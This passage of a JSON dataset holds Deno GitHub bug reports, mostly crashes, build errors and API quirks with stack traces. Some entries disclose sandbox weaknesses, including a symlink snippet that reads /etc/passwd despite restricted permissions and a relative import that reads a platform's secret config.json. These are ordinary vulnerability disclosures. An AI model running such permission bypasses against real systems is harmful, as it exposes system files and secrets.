`--no-remote`.\r\n\r\nThe big danger here obviously is that dynamic requests can be used for data exfiltration. Blocked net access should not only error, they should not be allowed to go out at all.\r\n\r\nIt's hard to create a fully reproducible test case, but FWIW I uncovered this while building [deno-sandbox-tests](https://github.com/teleclimber/deno-sandbox-tests).\r\n\r\nI should note that I have not been able to check this independently of deno-sandbox-tests (which runs its \"remote\" server locally and on HTTP). I don't have an actual remote server handy for this and I was not successful in using a proxy to snoop on Deno requests.\r\n"},{"labels":["bug"],"text":"There seems to be an issue where Deno does not exit correctly if an uncaught exception occurs and a big WASM module was imported.\r\n\r\nThis seems to happen for modules around `100K` and bigger (from testing on my machine, vary the `10000` in for loop to get different size binary).\r\n\r\nNote: I ran across the issue while working on: https://github.com/dyedgreen/deno-sqlite, which uses a binary of around 1MB.\r\n\r\n## Steps to reproduce:\r\n\r\n1. Build big WASM file:\r\n```bash\r\ndeno --allow-write gen_big.js\r\nclang --target=wasm32 --no-standard-libraries -Wl,--no-entry -nostartfiles -O0 -o big.wasm big.c\r\n```\r\n2. Run `deno big.js`\r\n\r\n### Needed files\r\n```JavaScript\r\n// gen_big.js\r\n\r\nconst prefix = \"test\";\r\nconst str = \"int ?(a, b) { return a+b; }\";\r\n\r\nconst lines = [];\r\nconst main = [\"int a = 0;\"];\r\nfor (let i = 0; i < 10000; i ++) {\r\n  lines.push(str.replace(\"?\", prefix.concat(i)));\r\n  main.push(\"a = \" + prefix.concat(i) + \"(a, b);\");\r\n  if (i % 1000 === 0)\r\n    console.log(i);\r\n}\r\nmain.push(\"return a;\");\r\nconst total = lines.join(\"\\n\") + \"\\n\\n\" + `int __attribute__((used)) __attribute__ ((visibility (\"default\"))) add(int b) {\\n${main.join(\"\\n\")}\\n};\\n`;\r\nawait Deno.writeFile(\"big.c\", new TextEncoder().encode(total));\r\n```\r\n\r\n```JavaScript\r\n// big.js\r\n\r\nimport * as mod from \"./big.wasm\";\r\n\r\nthrow new Error(\"Does not die :(\");\r\n```\r\n"},{"labels":["bug"],"text":"I tried to execute deno on Azure Web Apps (Windows Server 2016, build 10.0.14393.0).\r\nBut when executing deno, following error is shown.\r\n\r\nCould you please let me know any hints in order to execute deno on Azure Web Apps if there is?\r\n\r\n```\r\nD:\\home>D:\\home\\.deno\\bin\\deno.exe\r\nthread 'main' panicked at 'Could not get home directory.', src\\libcore\\option.rs:1190:5\r\nstack backtrace:\r\n   0:     0x7ff7780e3ad9 - <unknown>\r\n   1:     0x7ff77810510b - <unknown>\r\n   2:     0x7ff7780dbac4 - <unknown>\r\n   3:     0x7ff7780e68e0 - <unknown>\r\n   4:     0x7ff7780e650a - <unknown>\r\n   5:     0x7ff7780e7138 - <unknown>\r\n   6:     0x7ff7780e6ca4 - <unknown>\r\n   7:     0x7ff7780e6b89 - <unknown>\r\n   8:     0x7ff7781018f9 - <unknown>\r\n   9:     0x7ff778101966 - <unknown>\r\n  10:     0x7ff777c14494 - <unknown>\r\n  11:     0x7ff777c3eca3 - <unknown>\r\n\r\n  12:     0x7ff777b336e7 - <unknown>\r\n  13:     0x7ff777b35349 - <unknown>\r\n  14:     0x7ff777af1046 - <unknown>\r\n  15:     0x7ff7780e6ae7 - <unknown>\r\n  16:     0x7ff7780f4232 - <unknown>\r\n  17:     0x7ff7780e7472 - <unknown>\r\n  18:     0x7ff777af1037 - <unknown>\r\n  19:     0x7ff778a08938 - CrashForExceptionInNonABICompliantCodeRange\r\n  20:     0x7fffd85b84d4 - BaseThreadInitThunk\r\n  21:     0x7fffdacae851 - RtlUserThreadStart\r\n```\r\n\r\nI would appreciate your help.\r\n\r\nFYI.\r\nIn order to install deno, I fix the script as following before executing install.ps1.\r\n\r\n```\r\n17   \"D:\\Home\\.deno\\bin\"\r\n```\r\n\r\n```\r\n94    # [Environment]::SetEnvironmentVariable('Path', \"$Path;$BinDir\", $User)\r\n```\r\n"},{"labels":["bug"],"text":"Ops that are dispatched by plugins don't count towards Deno.metrics. This is because they don't go through ThreadSafeState.core_op."},{"labels":["bug"],"text":"```javascript\r\nconst promise = new Promise(r => {\r\n    let i = 100\r\n    while (i--) { }\r\n    r()\r\n})\r\n\r\nsetTimeout(() => promise.then(() => console.log('no')))\r\n\r\nsetTimeout(() => console.log('de'))\r\n```\r\nsame code different output\r\n\r\n`node` and `deno`\r\n![](https://i.loli.net/2019/12/02/p2ElmhZqVO96cdS.png)\r\n\r\nbrowser\r\n![](https://i.loli.net/2019/12/02/gjI56kczrVJ2uhA.png)"},{"labels":["bug"],"text":"The [documentation](https://deno.land/typedoc/interfaces/deno.readcloser.html#read) suggests read should return immediately rather than wait for the program to exit:\r\n\r\n> conventionally returns what is available instead of waiting for more.\r\n\r\nExample:\r\n```ts\r\nconst p = Deno.run({\r\n  args: [\r\n    \"python\",\r\n    \"-c\",\r\n    \"import time; print('hello'); time.sleep(2); print('kill before this')\"\r\n  ],\r\n  stdout: \"piped\"\r\n});\r\n\r\nconsole.log(\"waiting...\");\r\nawait new Promise(resolve => setTimeout(resolve, 1000));\r\n\r\nconsole.log(\"reading\");\r\nconst buf = new Uint8Array(100);\r\nconst n = Number(await p.stdout.read(buf)); // Ignore EOF.\r\nconsole.log(`read ${n} bytes from stdout`);\r\n\r\nconst dec = new TextDecoder();\r\nconsole.log(\"read:\", JSON.stringify(dec.decode(buf.slice(0, n))));\r\n\r\np.kill(9);\r\nconsole.log(await p.status());\r\nconsole.log(\"killed\");\r\n``` \r\n\r\noutput:\r\n```\r\nwaiting...\r\nreading\r\nread 23 bytes from stdout\r\nread: \"hello\\nkill before this\\n\"\r\n{ signal: 9, success: false }\r\nkilled\r\n```\r\n\r\nexpected:\r\n\r\n```\r\nwaiting...\r\nreading\r\nread 6 bytes from stdout\r\nread: \"hello\\n\"\r\n{ signal: 9, success: false }\r\nkilled\r\n```"},{"labels":["bug",null],"text":"In the current version of Deno (0.24) it is possible to import a module from outside the directory of the running script:\r\n\r\n```\r\nimport * as secrets from \"../../../elsewhere/config.json\";\r\n```\r\n\r\nMy understanding is that this is justified because a malicious script can not know where it is going to be run and therefore an attempt to load a relative path as above will almost always result in Deno exiting with an error.\r\n\r\nAlthough it's true that in some uses of Deno a malicious script author can not know where a json with secrets might be located relative to where it is run, there is one situation where this can be known: if Deno is used as the sandbox subsystem of a larger system, then Deno will always be called in the same way (predictable cwd and path to potential secrets).\r\n\r\nImagine for example an application platform that uses Deno as its sandbox. It has the following data directory:\r\n\r\n```\r\n- data-dir\r\n | - config.json   // includes api keys and other secrets\r\n | - more stuff.../\r\n | - untrusted-app-code/\r\n   | - malicious-app/\r\n```\r\n\r\nThe application platform would probably call Deno with very limited permissions, and it certainly will not provide an `allow-read` permission that includes config.json.\r\n\r\nHowever the malicious app will not need that. If it's designed to run on the platform it can read `config.json` like this:\r\n\r\n```\r\nimport * as platform_config from '../../config.json`\r\n```\r\n\r\nI believe Deno should disallow relative static imports outside of the main script's directory unless `--allow-read` allows it.\r\n\r\nThanks,\r\n\r\n✌️"},{"labels":["bug"],"text":"Follow-up for #3328 \r\n\r\nwasm import currently does double compilation: the first compilation happens here:\r\nhttps://github.com/denoland/deno/blob/4902a1cacb0348efde9ab342172f2706ac27e837/cli/js/compiler.ts#L753\r\n\r\nand the second time happens here:\r\nhttps://github.com/denoland/deno/blob/4902a1cacb0348efde9ab342172f2706ac27e837/cli/compilers/wasm_wrap.js#L15\r\n\r\nThe first compilation is to enable us to get imports/exports info such that we are able to build a dynamic script with static imports and named exports. The second one is for the later actual instantiation.\r\n\r\nIdeally we should be able to just compile once, and in the module evaluation script we can somehow get a handle to the old compiled object. However currently these 2 compilations happens in 2 different isolates (first in some compiler isolate, second in the main isolate), thus making storing and transferring the compiled object difficult.\r\n\r\nI'm not so sure if SyntheticModule APIs could be useful, since handling imports in its evaluation steps would be painful while doing exports is easy. Also we still need to create some js/.d.ts code for the module to placate TS compiler for named exports (especially under de-structuring)"},{"labels":["bug",null],"text":"Getting this error:\r\n\r\n`/usr/local/etc/zsh_completion.d/deno.zsh:478: no matches found: _deno__[SCRIPT]_commands`"},{"labels":["bug",null],"text":"It would seem that the [`equal`](https://github.com/denoland/deno/blob/0d41b10ade91039339173476848f7368b6dc0853/std/testing/asserts.ts#L70) function consumed by `assertEquals` in the [asserts module](https://github.com/denoland/deno/blob/0d41b10ade91039339173476848f7368b6dc0853/std/testing/asserts.ts) doesn't verify the deep equality of Map instances. Therefore:\r\n\r\n```ts\r\nassertEquals(\r\n  new Map([['foo', 'bar']]),\r\n  new Map([['bar', 'foo']]),\r\n);\r\n```\r\n\r\ndoesn't throw an `AssertionError`, whereas I'd certainly expect a test failure.\r\n\r\nWas it an intentional decision to omit Map support, or is it an oversight? If it's the latter, I'm happy to raise a PR to fix it."},{"labels":["bug",null],"text":"https://deno.land/std/http/file_server.ts can not handle urls like /test%20file.txt - it does not seem to parse URL encoded characters like %20."},{"labels":["bug"],"text":"When using dialTLS, `Conn.read()` will stop resolving if you write to the connection from a promise resolution if the promise is not immediately resolved.\r\n[Repro code](https://gist.github.com/qwerasd205/1b1fcc3cf2fa60adc135d406b50384c4)\r\nExpected output:\r\n```\r\nSending req #1 (normal)\r\nResponse!\r\nSending req #2 (Immediate promise resolution)\r\nResolved! (sending)\r\nResponse!\r\nSending req #3 (Delayed promise resolution)\r\nResolved! (sending)\r\nResponse!\r\nAll responses recieved correctly, exiting.\r\n```\r\nActual output:\r\n```\r\nSending req #1 (normal)\r\nResponse!\r\nSending req #2 (Immediate promise resolution)\r\nResolved! (sending)\r\nResponse!\r\nSending req #3 (Delayed promise resolution)\r\nResolved! (sending)\r\nNo response after 8 seconds, exiting.\r\n```\r\nIf you change the code to use Deno.dial and port 80 you get the expected output, so the issue is unique to dialTLS."},{"labels":["bug",null],"text":"Running:\r\n\r\n```sh\r\nRUST_BACKTRACE=1 cargo build -vv\r\n```\r\n\r\nYields:\r\n\r\n```\r\nUnable to load AWS_CREDENTIAL_FILE ()\r\n```\r\n\r\nFull stack trace:\r\n\r\n```\r\n--- stderr\r\nFailed to fetch file gs://chromium-clang-format/025ca7c75f37ef4a40f3a67d81ddd11d7d0cdb9b for /Users/jamiebuilds/Projects/deno/core/libdeno/buildtools/mac/clang-format. [Err: /Users/jamiebuilds/Projects/deno/third_party/depot_tools/external_bin/gsutil/gsutil_4.28/gsutil/third_party/boto/boto/pyami/config.py:69: UserWarning: Unable to load AWS_CREDENTIAL_FILE ()\r\n  warnings.warn('Unable to load AWS_CREDENTIAL_FILE (%s)' % full_path)\r\n]\r\nthread 'main' panicked at 'assertion failed: status.success()', core/build.rs:94:9\r\nstack backtrace:\r\n   0: backtrace::backtrace::libunwind::trace\r\n             at /Users/vsts/.cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.34/src/backtrace/libunwind.rs:88\r\n   1: backtrace::backtrace::trace_unsynchronized\r\n             at /Users/vsts/.cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.34/src/backtrace/mod.rs:66\r\n   2: std::sys_common::backtrace::_print\r\n             at src/libstd/sys_common/backtrace.rs:47\r\n   3: std::sys_common::backtrace::print\r\n             at src/libstd/sys_common/backtrace.rs:36\r\n   4: std::panicking::default_hook::{{closure}}\r\n             at src/libstd/panicking.rs:200\r\n   5: std::panicking::default_hook\r\n             at src/libstd/panicking.rs:214\r\n   6: std::panicking::rust_panic_with_hook\r\n             at src/libstd/panicking.rs:477\r\n   7: std::panicking::begin_panic\r\n   8: build_script_build::gn::Build::run\r\n             at core/build.rs:94\r\n   9: build_script_build::main\r\n             at core/build.rs:9\r\n  10: std::rt::lang_start::{{closure}}\r\n             at /rustc/625451e376bb2e5283fc4741caa0a3e8a2ca4d54/src/libstd/rt.rs:64\r\n  11: std::rt::lang_start_internal::{{closure}}\r\n             at src/libstd/rt.rs:49\r\n  12: std::panicking::try::do_call\r\n             at src/libstd/panicking.rs:296\r\n  13: __rust_maybe_catch_panic\r\n             at src/libpanic_unwind/lib.rs:80\r\n  14: std::panicking::try\r\n             at src/libstd/panicking.rs:275\r\n  15: std::panic::catch_unwind\r\n             at src/libstd/panic.rs:394\r\n  16: std::rt::lang_start_internal\r\n             at src/libstd/rt.rs:48\r\n  17: std::rt::lang_start\r\n             at /rustc/625451e376bb2e5283fc4741caa0a3e8a2ca4d54/src/libstd/rt.rs:64\r\n  18: build_script_build::main\r\n```\r\n\r\nI did already have `depot_tools` cloned on my machine and setup in my `PATH` but I removed it to see if there was some unusual conflict there\r\n\r\n\r\n"},{"labels":["bug"],"text":"Hi,\r\n\r\nAs described in this [issue](https://github.com/denoland/deno_std/issues/543#issuecomment-541817552), when I run `cargo test` I receive this output:\r\n\r\n```\r\nFAILED (errors=1)\r\n', cli/tests/util/mod.rs:34:5\r\nstack backtrace:\r\n   0: backtrace::backtrace::libunwind::trace\r\n             at /Users/vsts/.cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.34/src/backtrace/libunwind.rs:88\r\n   1: backtrace::backtrace::trace_unsynchronized\r\n             at /Users/vsts/.cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.34/src/backtrace/mod.rs:66\r\n   2: std::sys_common::backtrace::_print\r\n             at src/libstd/sys_common/backtrace.rs:47\r\n   3: std::sys_common::backtrace::print\r\n             at src/libstd/sys_common/backtrace.rs:36\r\n   4: std::panicking::default_hook::{{closure}}\r\n             at src/libstd/panicking.rs:200\r\n   5: std::panicking::default_hook\r\n             at src/libstd/panicking.rs:211\r\n   6: std::panicking::rust_panic_with_hook\r\n             at src/libstd/panicking.rs:477\r\n   7: std::panicking::continue_panic_fmt\r\n             at src/libstd/panicking.rs:384\r\n   8: std::thread::local::fast::Key<T>::try_initialize\r\n   9: integration_tests::util::run_python_script\r\n             at cli/tests/util/mod.rs:34\r\n  10: integration_tests::fmt_test\r\n             at cli/tests/integration_tests.rs:32\r\n  11: integration_tests::fmt_test::{{closure}}\r\n             at cli/tests/integration_tests.rs:30\r\n  12: core::ops::function::FnOnce::call_once\r\n             at /rustc/625451e376bb2e5283fc4741caa0a3e8a2ca4d54/src/libcore/ops/function.rs:235\r\n  13: <alloc::boxed::Box<F> as core::ops::function::FnOnce<A>>::call_once\r\n             at /rustc/625451e376bb2e5283fc4741caa0a3e8a2ca4d54/src/liballoc/boxed.rs:787\r\n  14: __rust_maybe_catch_panic\r\n             at src/libpanic_unwind/lib.rs:80\r\n  15: std::panicking::try\r\n             at /rustc/625451e376bb2e5283fc4741caa0a3e8a2ca4d54/src/libstd/panicking.rs:275\r\n  16: std::panic::catch_unwind\r\n             at /rustc/625451e376bb2e5283fc4741caa0a3e8a2ca4d54/src/libstd/panic.rs:394\r\n  17: test::run_test::run_test_inner::{{closure}}\r\n             at src/libtest/lib.rs:1408\r\nnote: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.\r\n\r\n---- js_unit_tests stdout ----\r\nthread 'js_unit_tests' panicked at 'called `Result::unwrap()` on an `Err` value: \"PoisonError { inner: .. }\"', src/libcore/result.rs:1084:5\r\nstack backtrace:\r\n   0: backtrace::backtrace::libunwind::trace\r\n             at /Users/vsts/.cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.34/src/backtrace/libunwind.rs:88\r\n   1: backtrace::backtrace::trace_unsynchronized\r\n             at /Users/vsts/.cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.34/src/backtrace/mod.rs:66\r\n   2: std::sys_common::backtrace::_print\r\n             at src/libstd/sys_common/backtrace.rs:47\r\n   3: std::sys_common::backtrace::print\r\n             at src/libstd/sys_common/backtrace.rs:36\r\n   4: std::panicking::default_hook::{{closure}}\r\n             at src/libstd/panicking.rs:200\r\n   5: std::panicking::default_hook\r\n             at src/libstd/panicking.rs:211\r\n   6: std::panicking::rust_panic_with_hook\r\n             at src/libstd/panicking.rs:477\r\n   7: std::panicking::continue_panic_fmt\r\n             at src/libstd/panicking.rs:384\r\n   8: rust_begin_unwind\r\n             at src/libstd/panicking.rs:311\r\n   9: std::panicking::begin_panic\r\n  10: std::panicking::begin_panic\r\n  11: core::result::Result<T,E>::unwrap\r\n             at /rustc/625451e376bb2e5283fc4741caa0a3e8a2ca4d54/src/libcore/result.rs:852\r\n  12: deno_cli::test_util::http_server\r\n             at cli/test_util.rs:62\r\n  13: integration_tests::js_unit_tests\r\n             at cli/tests/integration_tests.rs:38\r\n  14: integration_tests::js_unit_tests::{{closure}}\r\n             at cli/tests/integration_tests.rs:37\r\n  15: core::ops::function::FnOnce::call_once\r\n             at /rustc/625451e376bb2e5283fc4741caa0a3e8a2ca4d54/src/libcore/ops/function.rs:235\r\n  16: <alloc::boxed::Box<F> as core::ops::function::FnOnce<A>>::call_once\r\n             at /rustc/625451e376bb2e5283fc4741caa0a3e8a2ca4d54/src/liballoc/boxed.rs:787\r\n  17: __rust_maybe_catch_panic\r\n             at src/libpanic_unwind/lib.rs:80\r\n  18: std::panicking::try\r\n             at /rustc/625451e376bb2e5283fc4741caa0a3e8a2ca4d54/src/libstd/panicking.rs:275\r\n  19: std::panic::catch_unwind\r\n             at /rustc/625451e376bb2e5283fc4741caa0a3e8a2ca4d54/src/libstd/panic.rs:394\r\n  20: test::run_test::run_test_inner::{{closure}}\r\n             at src/libtest/lib.rs:1408\r\nnote: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.\r\n```\r\n\r\nMy `cargo --version` is `cargo 1.38.0 (23ef9a4ef 2019-08-20)` & `rustc --version` is `rustc 1.38.0 (625451e37 2019-09-23)`.\r\n\r\nI also get this error earlier in the format test (`python2 tools/format.py` passes) and that is where the panic occurs:\r\n\r\n```\r\nTraceback (most recent call last):\r\n  File \"tools/fmt_test.py\", line 31, in test_fmt\r\n    quiet=True)\r\n  File \"/Users/usrname/Documents/deno/tools/util.py\", line 99, in run_output\r\n    sys.exit(retcode)\r\nSystemExit: -4\r\n```\r\n\r\nI don't know enough about the logic of `util.py` to know why this is being thrown from L99 but it's in the `run_output` function."},{"labels":["bug"],"text":"## Problem\r\nI had just something to test with deno repl. I was trying this code:\r\n\r\n```ts\r\nobjWithFunc =\r\n   { sayHi: function() {\r\n       console.log(`hi, ${this.name}!;`; \r\n       console.log(this))\r\n        }, \r\n      name: 'Joel' \r\n   };\r\n```\r\n\r\nobviously it contained syntax errors, but I didn't know that (primarily because I just typed all that in one line) until I ran this code again with node repl and threw an error, while Deno stayed silent. It just does nothing and allows you to type anything more, like as if the code has not been finished yet:\r\n\r\n[![asciicast](https://asciinema.org/a/mrwZjD7FFV8XAX77yqYF2mt3R.svg)](https://asciinema.org/a/mrwZjD7FFV8XAX77yqYF2mt3R)\r\n\r\nIt throws an error on node. But it does not on deno. I think the expected action should be to throw an error. \r\n\r\n## Environment\r\n```bash\r\n$ uname -a\r\nDarwin 7o 18.7.0 Darwin Kernel Version 18.7.0: Tue Aug 20 16:57:14 PDT 2019; root:xnu-4903.271.2~2/RELEASE_X86_64 x86_64\r\n$ deno -v\r\ndeno: 0.20.0\r\nv8: 7.9.218\r\ntypescript: 3.6.3\r\n```\r\n"},{"labels":["bug"],"text":"```\r\n➜  try deno\r\n> \r\nUnable to save REPL history: \"/home/jason/.cache/deno/deno_history.txt\" directory does not exist\r\n```"},{"labels":["bug"],"text":"Related to #2797 (fix in #3019)\r\n\r\nUncaught worker errors should trigger an `ErrorEvent` which can be handled by the `.onerror` handler.  For example this should work under Deno:\r\n\r\n```ts\r\nconst worker = new Worker(\"./something.js\");\r\nworker.onerror = (evt) => {\r\n  console.log(evt);\r\n  evt.preventDefault();\r\n};\r\n```\r\n\r\nIf the error event isn't cancelled, it should bubble up to the `window.onerror` (as a normal `Error`).\r\n"},{"labels":["bug"],"text":"Writing tests for HTTP proxy I hit this bug. Given such function:\r\n```ts\r\nasync function testModuleDownload(): Promise<void> {\r\n  const http = Deno.run({\r\n    args: [\r\n      Deno.execPath(),\r\n      \"--no-prompt\",\r\n      \"--reload\",\r\n      \"fetch\",\r\n      \"http://deno.land/welcome.ts\"\r\n    ],\r\n    stdout: \"piped\",\r\n    env: {\r\n      HTTP_PROXY: `http://${addr}`\r\n    }\r\n  });\r\n\r\n  // notice await for status twice here\r\n  await http.status();\r\n  const httpStatus = await http.status();\r\n  assertEquals(httpStatus.code, 0);\r\n  http.close();\r\n}\r\n```\r\n\r\nThe tests passed fine on Linux/Mac but hang on Windows. This is definitely bad behavior, I can imagine situation where you await for status in two different places.\r\n\r\n~~I imagine this issue can be easily solved like this:~~\r\n```ts\r\n// js/process.js\r\nexport class Process {\r\n  private _runStatus\r\n  ...\r\n  async status(): Promise<ProcessStatus> {\r\n    if (this._runStatus) {\r\n      return Promise.resolve(this._runStatus)\r\n    }\r\n    this._runStatus = await runStatus(this.rid);\r\n    return this._runStatus;\r\n  }\r\n  ...\r\n}\r\n```\r\nAbove solution probably won't work if status hasn't been resolved and two callers await the actual promise."},{"labels":["bug",null],"text":"I can't currently build on master (82dc1b8e59891a7ca0f1a5e67a3db952b918561c).  The build fails when running `./tools/setup.py` and trying to run it directly outside of the build also fails with the same error message which is:\r\n\r\n```\r\n$ ./tools/setup.py\r\nbinary download\r\n/Users/kkelly/github/deno/third_party/depot_tools/cipd install gn/gn/mac-amd64 git_revision:152c5144ceed9592c20f0c8fd55769646077569b -root /Users/kkelly/github/deno/core/libdeno/buildtools/mac\r\nPackage gn/gn/mac-amd64 is up-to-date.\r\n/usr/local/opt/python@2/bin/python2.7 /Users/kkelly/github/deno/third_party/depot_tools/download_from_google_storage.py --platform=darwin --no_auth --bucket=chromium-clang-format --sha1_file /Users/kkelly/github/deno/core/libdeno/buildtools/mac/clang-format.sha1\r\n/usr/local/opt/python@2/bin/python2.7 /Users/kkelly/github/deno/core/libdeno/v8/tools/clang/scripts/update.py\r\n/usr/local/opt/python@2/bin/python2.7 /Users/kkelly/github/deno/third_party/depot_tools/download_from_google_storage.py --platform=darwin --no_auth --bucket=denoland --sha1_file /Users/kkelly/github/deno/prebuilt/mac/sccache.sha1\r\nrelease: Writing gn options to '/Users/kkelly/github/deno/target/release/args.gn'.\r\nTraceback (most recent call last):\r\n  File \"./tools/setup.py\", line 186, in <module>\r\n    sys.exit(main())\r\n  File \"./tools/setup.py\", line 41, in main\r\n    gn_gen(\"release\")\r\n  File \"./tools/setup.py\", line 173, in gn_gen\r\n    gn_args = generate_gn_args(mode)\r\n  File \"./tools/setup.py\", line 131, in generate_gn_args\r\n    if not os.path.exists(cacher):\r\n  File \"/usr/local/Cellar/python@2/2.7.16_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/genericpath.py\", line 26, in exists\r\n    os.stat(path)\r\nTypeError: coercing to Unicode: need string or buffer, NoneType found\r\n```\r\n\r\nI have tried 1b1ae65a4a2acd55ead86c17e388f10a0e08938d which builds, but the commit after 56ac638d93c96712d6c624e60dcfa4540d334b18 breaks.  So it appears to be something in 56ac638d93c96712d6c624e60dcfa4540d334b18.\r\n\r\n"},{"labels":["bug"],"text":"Generally a linux executable will turn off arg processing when it encounters two dashes, e.g. `deno -A -- one two three` should run the repl and have `Deno.args` be `[\"one\", \"two\", \"three\"]`. \r\n\r\nIn deno 18.4 installed via cargo:\r\n```bash\r\n$ deno --version\r\ndeno: 0.18.4\r\nv8: 7.9.8\r\ntypescript: 3.5.1\r\n\r\n $ deno -A -- one two three\r\nCannot resolve module \"file:///home/mcarifio/one\"\r\n```\r\n\r\n`deno --help` currently doesn't tell me to expect -- to turn off arg processing, so it works as described. @ry asked me to file this as an issue; doing as instructed :-)."},{"labels":["bug"],"text":"This is what it looks like in CI... \r\n```\r\nSummary for <no permissions>\r\nundefined\r\n```\r\nand at the end you'll see\r\n```\r\n---- js_unit_tests stdout ----\r\ntools/http_server.py starting...\r\ntools/http_server.py ready\r\ntarget_dir d:\\a\\deno\\deno\\target\\release\r\nthread 'js_unit_tests' panicked at 'assertion failed: `(left == right)`\r\n  left: `Some(0)`,\r\n right: `Some(1)`', cli\\tests\\integration_tests.rs:49:3\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace.\r\n\r\n\r\nfailures:\r\n    js_unit_tests\r\n\r\ntest result: FAILED. 86 passed; 1 failed; 0 ignored; 0 measured; 0 filtered out\r\n```\r\nhere are some examples: \r\nhttps://ci.appveyor.com/project/deno/deno/builds/27512116\r\nhttps://github.com/denoland/deno/pull/2967/checks?check_run_id=227777082\r\nhttps://github.com/denoland/deno/pull/2967/checks?check_run_id=227919430\r\n\r\ni already tried something https://github.com/denoland/deno/pull/2982 but it didnt stop it\r\n\r\nThe segfaults have been there for a long time now - maybe weeks. But they used to be less frequent. Due to Github actions we're running 2x as many windows builds - so maybe it's just showing up 2x more frequently.\r\n"},{"labels":["bug"],"text":"```\r\ndeno -Acli/tests/001_hello.js\r\nthread 'main' panicked at 'called `Result::unwrap()` on an `Err` value: Os { code: 2, kind: NotFound, message: \"No such file or directory\" }', src/libcore/result.rs:999:5\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace.\r\n```\r\n\r\nIt should error and exit but not panic."},{"labels":["bug"],"text":"```\r\n> ./target/debug/deno test js/version_test.ts\r\nDownload https://deno.land/std@06958a4/testing/runner.ts\r\nCompile https://deno.land/std@06958a4/testing/runner.ts\r\nDownload https://deno.land/std@06958a4/fs/mod.ts\r\nDownload https://deno.land/std@06958a4/testing/mod.ts\r\nDownload https://deno.land/std@06958a4/fs/empty_dir.ts\r\nDownload https://deno.land/std@06958a4/fs/ensure_dir.ts\r\nDownload https://deno.land/std@06958a4/fs/ensure_file.ts\r\nDownload https://deno.land/std@06958a4/fs/ensure_link.ts\r\nDownload https://deno.land/std@06958a4/fs/ensure_symlink.ts\r\nDownload https://deno.land/std@06958a4/fs/exists.ts\r\nDownload https://deno.land/std@06958a4/fs/move.ts\r\nDownload https://deno.land/std@06958a4/fs/copy.ts\r\nDownload https://deno.land/std@06958a4/fs/read_file_str.ts\r\nDownload https://deno.land/std@06958a4/fs/write_file_str.ts\r\nDownload https://deno.land/std@06958a4/fs/read_json.ts\r\nDownload https://deno.land/std@06958a4/fs/write_json.ts\r\nDownload https://deno.land/std@06958a4/fs/eol.ts\r\nDownload https://deno.land/std@06958a4/fs/utils.ts\r\nFound 4 matching test files.\r\nCompile file:///Users/rld/src/deno/js/version_test.ts\r\nerror: Uncaught SyntaxError: Unexpected token ':'\r\n► file:///Users/rld/src/deno/target/debug/.deno_test/gen/file/Users/rld/src/deno/js/version_test.ts.js.map:1:11\r\n\r\n1 {\"version\":3,\"file\":\"version_test.js\",\"sourceRoot\":\"\",\"sources\":[\"file:///Users/rld/src/deno/js/version_test.ts\"],\"names\":[],\"mappings\":\"AAAA,OAAO,EAAE,IAAI,EAAE,MAAM,EAAE,MAAM,gBAAgB,CAAC;AAE9C,IAAI,CAAC,SAAS,OAAO;IACnB,MAAM,OAAO,GAAG,iBAAiB,CAAC;IAClC,MAAM,CAAC,OAAO,CAAC,IAAI,CAAC,IAAI,CAAC,OAAO,CAAC,IAAI,CAAC,CAAC,CAAC;IACxC,MAAM,CAAC,OAAO,CAAC,IAAI,CAAC,IAAI,CAAC,OAAO,CAAC,EAAE,CAAC,CAAC,CAAC;IACtC,MAAM,CAAC,OAAO,CAAC,IAAI,CAAC,IAAI,CAAC,OAAO,CAAC,UAAU,CAAC,CAAC,CAAC;AAChD,CAAC,CAAC,CAAC\"}\r\n            ^\r\n```"},{"labels":["bug"],"text":"As you can see, `lib.deno_runtime.d.ts` publicly declares namespaces `domTypes`, `blob`, `consoleTypes`, `event`, `customEvent`, `eventTarget`, `io`, `fetchTypes`, `textEncoding`, `timers`, `urlSearchParams`, `url`, `workers`, and `performanceUtil` which should all be internal.\r\n\r\nYou can't declare them as variables in typescript - `let url;` throws during compilation:\r\n```\r\nerror TS2451: Cannot redeclare block-scoped variable 'url'.\r\n\r\n► $asset$/lib.deno_runtime.d.ts:2514:19\r\n\r\n2514 declare namespace url {\r\n                       ~~~\r\n\r\n  'url' was also declared here.\r\n...\r\n```"},{"labels":["bug"],"text":"Ref: https://github.com/denoland/deno/pull/2760\r\n\r\n> This fixes a very acute problem, so I'm all for landing this.\r\nHowever, we have similar problems with other path components, which can also contain illegal characters (e.g. `?` and `&`).\r\n\r\n> Tangentially related, there's also a correctness issue w.r.t. case sensitivity. In URLs the path and query component are case sensitive, while the protocol and host are not. When deno_dir lives on a case insensitive file system it won't be able to handle that properly.\r\n\r\n_Originally posted by @piscisaureus in https://github.com/denoland/deno/pull/2760#issuecomment-520247523_\r\n\r\n> > However, we have similar problems with other path components, which can also contain illegal characters (e.g. `?` and `&`).\r\n\r\n> Haven't thought about it, but I believe `Url` won't return them from `path_segments` method. That inherently means that `http://example.com/a.js?foo` would be cached as `http/example.com/a.js`.\r\n\r\n\r\n> > Tangentially related, there's also a correctness issue w.r.t. case sensitivity. In URLs the path and query component are case sensitive, while the protocol and host are not. When deno_dir lives on a case insensitive file system it won't be able to handle that properly.\r\n\r\n> Agreed, any ideas how to tackle that? Cast all protocols and hostnames to lowercase?\r\n\r\n_Originally posted by @bartlomieju in https://github.com/denoland/deno/pull/2760#issuecomment-520247862_\r\n\r\n> > Haven't thought about it, but I believe `Url` won't return them from `path_segments` method. That inherently means that `http://example.com/a.js?foo` would be cached as `http/example.com/a.js`.\r\n\r\n> That doesn't seem right either. Only the part after `#` can be safely discarded.\r\n\r\n_Originally posted by @piscisaureus in https://github.com/denoland/deno/pull/2760#issuecomment-520248702_"},{"labels":["bug"],"text":"With `--allow-read=. --allow-write=.`, execute:\r\n```javascript\r\nDeno.symlinkSync('/etc/passwd', 'passwd');\r\nconsole.log(new TextDecoder().decode(Deno.readFileSync('passwd')));\r\n```"},{"labels":["bug"],"text":"`Deno.link()` should be as 